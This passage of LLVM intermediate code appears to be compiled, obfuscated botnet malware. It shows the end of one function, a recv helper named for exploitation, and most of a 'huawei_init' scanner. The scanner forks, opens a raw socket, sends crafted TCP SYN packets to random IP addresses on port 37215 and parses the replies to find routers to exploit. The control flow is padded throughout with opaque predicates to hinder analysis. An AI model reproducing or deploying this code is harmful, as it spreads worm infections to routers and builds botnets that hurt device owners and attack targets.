  %109 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %110 = load %struct.sockaddr*, %struct.sockaddr** %109, align 8
  %111 = call i32 @connect(i32 %106, %struct.sockaddr* %110, i32 16)
  br label %originalBB1
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @exploit_recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.55
  %6 = load i32, i32* @y.56
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  %19 = load i32, i32* %13, align 4
  %20 = load i8*, i8** %14, align 8
  %21 = load i32, i32* %15, align 4
  %22 = sext i32 %21 to i64
  %23 = load i32, i32* %16, align 4
  %24 = call i64 @recv(i32 %19, i8* %20, i64 %22, i32 %23)
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  %27 = icmp sgt i32 %26, 0
  %28 = load i32, i32* @x.55
  %29 = load i32, i32* @y.56
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %59

; <label>:36:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %18, align 4
  br label %37

; <label>:37:                                     ; preds = %55, %36
  %38 = load i32, i32* %18, align 4
  %39 = load i32, i32* %17, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %14, align 8
  %43 = load i32, i32* %18, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %54

; <label>:49:                                     ; preds = %41
  %50 = load i8*, i8** %14, align 8
  %51 = load i32, i32* %18, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 65, i8* %53, align 1
  br label %54

; <label>:54:                                     ; preds = %49, %41
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = load i32, i32* %18, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %18, align 4
  br label %37

; <label>:58:                                     ; preds = %37
  br label %59

; <label>:59:                                     ; preds = %58, %originalBBpart2
  %60 = load i32, i32* %17, align 4
  ret i32 %60

originalBBalteredBB:                              ; preds = %originalBB, %4
  %61 = alloca i32, align 4
  %62 = alloca i8*, align 8
  %63 = alloca i32, align 4
  %64 = alloca i32, align 4
  %65 = alloca i32, align 4
  %66 = alloca i32, align 4
  store i32 %0, i32* %61, align 4
  store i8* %1, i8** %62, align 8
  store i32 %2, i32* %63, align 4
  store i32 %3, i32* %64, align 4
  %67 = load i32, i32* %61, align 4
  %68 = load i8*, i8** %62, align 8
  %69 = load i32, i32* %63, align 4
  %70 = sext i32 %69 to i64
  %71 = load i32, i32* %64, align 4
  %72 = call i64 @recv(i32 %67, i8* %68, i64 %70, i32 %71)
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %65, align 4
  %74 = load i32, i32* %65, align 4
  %75 = icmp sgt i32 %74, 0
  br label %originalBB
}

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define void @huawei_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.anon.0*, align 8
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.exploit_scanner_connection*, align 8
  %8 = alloca %struct.timeval, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.anon.0*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.anon.0*, align 8
  %22 = alloca %struct.exploit_scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %34 = call i32 @fork() #6
  store i32 %34, i32* @huawei_scanner_pid, align 4
  %35 = load i32, i32* @huawei_scanner_pid, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %0
  %38 = load i32, i32* @huawei_scanner_pid, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37, %0
  ret void

; <label>:41:                                     ; preds = %37
  %42 = call i32 @util_local_addr()
  store i32 %42, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %43 = call i64 @time(i64* null) #6
  %44 = trunc i64 %43 to i32
  store i32 %44, i32* @huawei_fake_time, align 4
  %45 = call noalias i8* @calloc(i64 128, i64 5416) #6
  %46 = bitcast i8* %45 to %struct.exploit_scanner_connection*
  store %struct.exploit_scanner_connection* %46, %struct.exploit_scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %77, %41
  %48 = load i32, i32* %1, align 4
  %49 = icmp slt i32 %48, 128
  br i1 %49, label %50, label %80

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* @x.57
  %52 = load i32, i32* @y.58
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %62, i32 0, i32 2
  store i32 0, i32* %63, align 8
  %64 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %65 = load i32, i32* %1, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %64, i64 %66
  %68 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %67, i32 0, i32 0
  store i32 -1, i32* %68, align 8
  %69 = load i32, i32* @x.57
  %70 = load i32, i32* @y.58
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %77

; <label>:77:                                     ; preds = %originalBBpart2
  %78 = load i32, i32* %1, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %1, align 4
  br label %47

; <label>:80:                                     ; preds = %47
  %81 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %81, i32* @huawei_rsck, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %80
  call void @exit(i32 0) #12
  unreachable

; <label>:84:                                     ; preds = %80
  %85 = load i32, i32* @huawei_rsck, align 4
  %86 = load i32, i32* @huawei_rsck, align 4
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0)
  %88 = or i32 2048, %87
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %85, i32 4, i32 %88)
  store i32 1, i32* %1, align 4
  %90 = load i32, i32* @huawei_rsck, align 4
  %91 = bitcast i32* %1 to i8*
  %92 = call i32 @setsockopt(i32 %90, i32 0, i32 3, i8* %91, i32 4) #6
  %93 = icmp ne i32 %92, 0
  br i1 %93, label %94, label %113

; <label>:94:                                     ; preds = %84
  %95 = load i32, i32* @x.57
  %96 = load i32, i32* @y.58
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %94
  %103 = load i32, i32* @huawei_rsck, align 4
  %104 = call i32 @close(i32 %103)
  call void @exit(i32 0) #12
  %105 = load i32, i32* @x.57
  %106 = load i32, i32* @y.58
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:113:                                    ; preds = %84
  br label %114

; <label>:114:                                    ; preds = %originalBBpart218, %113
  %115 = load i32, i32* @x.57
  %116 = load i32, i32* @y.58
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %114
  %123 = call i32 @rand_next()
  %124 = and i32 %123, 65535
  %125 = trunc i32 %124 to i16
  store i16 %125, i16* %2, align 2
  %126 = load i32, i32* @x.57
  %127 = load i32, i32* @y.58
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %134

; <label>:134:                                    ; preds = %originalBBpart214
  %135 = load i32, i32* @x.57
  %136 = load i32, i32* @y.58
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %134
  %143 = load i16, i16* %2, align 2
  %144 = call zeroext i16 @ntohs(i16 zeroext %143) #9
  %145 = zext i16 %144 to i32
  %146 = icmp slt i32 %145, 1024
  %147 = load i32, i32* @x.57
  %148 = load i32, i32* @y.58
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %146, label %114, label %155

; <label>:155:                                    ; preds = %originalBBpart218
  %156 = load i32, i32* @x.57
  %157 = load i32, i32* @y.58
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %155
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %164 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i64 1
  %166 = bitcast %struct.iphdr* %165 to %struct.anon.0*
  store %struct.anon.0* %166, %struct.anon.0** %4, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %168 = bitcast %struct.iphdr* %167 to i8*
  %169 = load i8, i8* %168, align 4
  %170 = and i8 %169, -16
  %171 = or i8 %170, 5
  store i8 %171, i8* %168, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = call zeroext i16 @htons(i16 zeroext 40) #9
  %178 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = call i32 @rand_next()
  %181 = trunc i32 %180 to i16
  %182 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 64, i8* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 6
  store i8 6, i8* %187, align 1
  %188 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %189 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %2, align 2
  %192 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %193 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -241
  %198 = or i16 %197, 80
  store i16 %198, i16* %195, align 4
  %199 = call i32 @rand_next()
  %200 = and i32 %199, 65535
  %201 = trunc i32 %200 to i16
  %202 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %203 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %202, i32 0, i32 5
  store i16 %201, i16* %203, align 2
  %204 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %205 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -513
  %208 = or i16 %207, 512
  store i16 %208, i16* %205, align 4
  %209 = load i32, i32* @x.57
  %210 = load i32, i32* @y.58
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart294, label %originalBB20alteredBB

originalBBpart294:                                ; preds = %originalBB20
  br label %217

; <label>:217:                                    ; preds = %1374, %originalBBpart294
  %218 = load i32, i32* @x.57
  %219 = load i32, i32* @y.58
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %217
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %226 = load i32, i32* @huawei_fake_time, align 4
  %227 = load i32, i32* %10, align 4
  %228 = icmp ne i32 %226, %227
  %229 = load i32, i32* @x.57
  %230 = load i32, i32* @y.58
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br i1 %228, label %237, label %333

; <label>:237:                                    ; preds = %originalBBpart298
  %238 = load i32, i32* @huawei_fake_time, align 4
  store i32 %238, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %239

; <label>:239:                                    ; preds = %329, %237
  %240 = load i32, i32* @x.57
  %241 = load i32, i32* @y.58
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %239
  %248 = load i32, i32* %1, align 4
  %249 = icmp slt i32 %248, 160
  %250 = load i32, i32* @x.57
  %251 = load i32, i32* @y.58
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %249, label %258, label %332

; <label>:258:                                    ; preds = %originalBBpart2102
  %259 = load i32, i32* @x.57
  %260 = load i32, i32* @y.58
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %258
  %267 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %267, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %268 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i64 1
  %270 = bitcast %struct.iphdr* %269 to %struct.anon.0*
  store %struct.anon.0* %270, %struct.anon.0** %16, align 8
  %271 = call i32 @rand_next()
  %272 = trunc i32 %271 to i16
  %273 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 3
  store i16 %272, i16* %274, align 4
  %275 = load i32, i32* @LOCAL_ADDR, align 4
  %276 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 8
  store i32 %275, i32* %277, align 4
  %278 = call i32 @get_random_ip.76()
  %279 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 9
  store i32 %278, i32* %280, align 4
  %281 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 0, i16* %282, align 2
  %283 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %284 = bitcast %struct.iphdr* %283 to i16*
  %285 = call zeroext i16 @checksum_generic(i16* %284, i32 20)
  %286 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 7
  store i16 %285, i16* %287, align 2
  %288 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %289 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %290 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %289, i32 0, i32 1
  store i16 %288, i16* %290, align 2
  %291 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 9
  %293 = load i32, i32* %292, align 4
  %294 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 2
  store i32 %293, i32* %295, align 4
  %296 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %297 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %296, i32 0, i32 6
  store i16 0, i16* %297, align 4
  %298 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %299 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %300 = bitcast %struct.anon.0* %299 to i8*
  %301 = call zeroext i16 @htons(i16 zeroext 20) #9
  %302 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %298, i8* %300, i16 zeroext %301, i32 20)
  %303 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 6
  store i16 %302, i16* %304, align 4
  %305 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  %308 = load i32, i32* %307, align 4
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %310 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %309, i32 0, i32 0
  store i32 %308, i32* %310, align 4
  %311 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 1
  %313 = load i16, i16* %312, align 2
  %314 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %313, i16* %314, align 2
  %315 = load i32, i32* @huawei_rsck, align 4
  %316 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %317 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %317, %struct.sockaddr** %316, align 8
  %318 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %319 = load %struct.sockaddr*, %struct.sockaddr** %318, align 8
  %320 = call i64 @sendto(i32 %315, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %319, i32 16)
  %321 = load i32, i32* @x.57
  %322 = load i32, i32* @y.58
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %329

; <label>:329:                                    ; preds = %originalBBpart2106
  %330 = load i32, i32* %1, align 4
  %331 = add nsw i32 %330, 1
  store i32 %331, i32* %1, align 4
  br label %239

; <label>:332:                                    ; preds = %originalBBpart2102
  br label %333

; <label>:333:                                    ; preds = %332, %originalBBpart298
  store i32 0, i32* %9, align 4
  br label %334

; <label>:334:                                    ; preds = %originalBBpart2140, %535, %originalBBpart2132, %originalBBpart2122, %459, %451, %443, %434, %originalBBpart2118, %402, %395, %333
  store i32 0, i32* %18, align 4
  %335 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %336 = bitcast i8* %335 to %struct.iphdr*
  store %struct.iphdr* %336, %struct.iphdr** %20, align 8
  %337 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i64 1
  %339 = bitcast %struct.iphdr* %338 to %struct.anon.0*
  store %struct.anon.0* %339, %struct.anon.0** %21, align 8
  %340 = call i32* @__errno_location() #9
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* @huawei_rsck, align 4
  %342 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %343 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %343, align 8
  %344 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %345 = load %struct.sockaddr*, %struct.sockaddr** %344, align 8
  %346 = call i64 @recvfrom(i32 %341, i8* %342, i64 1514, i32 16384, %struct.sockaddr* %345, i32* null)
  %347 = trunc i64 %346 to i32
  store i32 %347, i32* %18, align 4
  %348 = load i32, i32* %18, align 4
  %349 = icmp sle i32 %348, 0
  br i1 %349, label %390, label %350

; <label>:350:                                    ; preds = %334
  %351 = load i32, i32* @x.57
  %352 = load i32, i32* @y.58
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %350
  %359 = call i32* @__errno_location() #9
  %360 = load i32, i32* %359, align 4
  %361 = icmp eq i32 %360, 11
  %362 = load i32, i32* @x.57
  %363 = load i32, i32* @y.58
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %361, label %390, label %370

; <label>:370:                                    ; preds = %originalBBpart2110
  %371 = load i32, i32* @x.57
  %372 = load i32, i32* @y.58
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %370
  %379 = call i32* @__errno_location() #9
  %380 = load i32, i32* %379, align 4
  %381 = icmp eq i32 %380, 11
  %382 = load i32, i32* @x.57
  %383 = load i32, i32* @y.58
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br i1 %381, label %390, label %391

; <label>:390:                                    ; preds = %originalBBpart2114, %originalBBpart2110, %334
  br label %607

; <label>:391:                                    ; preds = %originalBBpart2114
  %392 = load i32, i32* %18, align 4
  %393 = sext i32 %392 to i64
  %394 = icmp ult i64 %393, 40
  br i1 %394, label %395, label %396

; <label>:395:                                    ; preds = %391
  br label %334

; <label>:396:                                    ; preds = %391
  %397 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 9
  %399 = load i32, i32* %398, align 4
  %400 = load i32, i32* @LOCAL_ADDR, align 4
  %401 = icmp ne i32 %399, %400
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %396
  br label %334

; <label>:403:                                    ; preds = %396
  %404 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 6
  %406 = load i8, i8* %405, align 1
  %407 = zext i8 %406 to i32
  %408 = icmp ne i32 %407, 6
  br i1 %408, label %409, label %426

; <label>:409:                                    ; preds = %403
  %410 = load i32, i32* @x.57
  %411 = load i32, i32* @y.58
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %409
  %418 = load i32, i32* @x.57
  %419 = load i32, i32* @y.58
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %334

; <label>:426:                                    ; preds = %403
